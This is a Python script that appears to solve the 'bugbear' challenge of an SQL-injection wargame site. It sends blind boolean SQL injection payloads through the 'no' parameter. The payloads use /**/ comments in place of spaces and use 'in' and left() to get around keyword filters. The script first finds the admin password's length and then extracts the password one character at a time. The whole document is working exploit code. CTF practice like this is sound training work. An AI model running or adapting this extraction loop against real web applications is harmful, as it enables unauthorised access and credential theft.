import requests
import string
import os
from dotenv import load_dotenv

load_dotenv()

base_url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
cookie = {"PHPSESSID": os.getenv('PHPSESSID')}
pw_length = 0
pw = ""

a = string.printable

for i in range(100):
    res = requests.get(base_url, params={
                       'no': f"""0 || id in ("admin") && length(pw) in ({i})""".replace(" ", "/**/")}, cookies=cookie).text
    if "Hello admin" in res:
        print(f"length: {i}")
        pw_length = i
        break

for i in range(pw_length):
    for j in a:
        res = requests.get(base_url, params={
            'no': f"""0 || id in ("admin") && left(pw, {i + 1}) in ("{pw + j}") """.replace(" ", "/**/")}, cookies=cookie).text
        if "Hello admin" in res:
            print(f"pw[{i}] == {j}")
            pw += j
            break
print(pw)
